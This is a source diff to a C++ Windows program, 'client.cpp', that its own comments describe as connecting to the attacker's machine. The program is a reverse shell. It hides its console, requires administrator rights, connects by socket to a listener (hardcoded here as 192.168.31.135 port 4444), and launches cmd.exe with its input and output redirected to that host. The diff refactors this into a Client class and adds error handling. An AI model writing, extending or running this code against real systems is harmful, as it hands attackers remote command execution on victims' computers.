@@ -1,13 +1,8 @@
 // client.cpp
 // this code will try to connect to attacker's machine
 
-#include "includes.h"
-
-WSADATA wsaData;
-SOCKET wSock;
-struct sockaddr_in hax;
-STARTUPINFO sui;
-PROCESS_INFORMATION pi;
+#include "client.h"
+#include "server.h"
 
 bool isAdmin() { // check is program running with admin rights
     bool isElevated = false;
@@ -26,18 +21,13 @@ bool isAdmin() { // check is program running with admin rights
     return isElevated;
 }
 
-int main(int argc, char* argv[])
-{
+int Client::connect(short port, char *ip) {
     FreeConsole(); // hide console window
 
     if (!isAdmin()) {
         MessageBox(NULL, "Run this as administrator!", "Fatal error", MB_ICONERROR | MB_OK);
         return -1;
     }
-
-    // listener ip, port on attacker's machine
-    char *ip = "127.0.0.1";
-    short port = 4444;
 
     // init socket lib
     WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -50,7 +40,10 @@ int main(int argc, char* argv[])
     hax.sin_addr.s_addr = inet_addr(ip);
 
     // connect to remote host
-    WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
+    if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) != 0) {
+        MessageBox(NULL, "Failed to connect!", "Fatal error", MB_ICONERROR | MB_OK);
+        return -1;
+    }
 
     memset(&sui, 0, sizeof(sui));
     sui.cb = sizeof(sui);
@@ -60,4 +53,12 @@ int main(int argc, char* argv[])
     // start cmd.exe with redirected streams
     CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
     exit(0);
+}
+
+int main() 
+{
+    Client main_client;
+    main_client.connect(4444, "192.168.31.135");
+
+    return 0;
 }
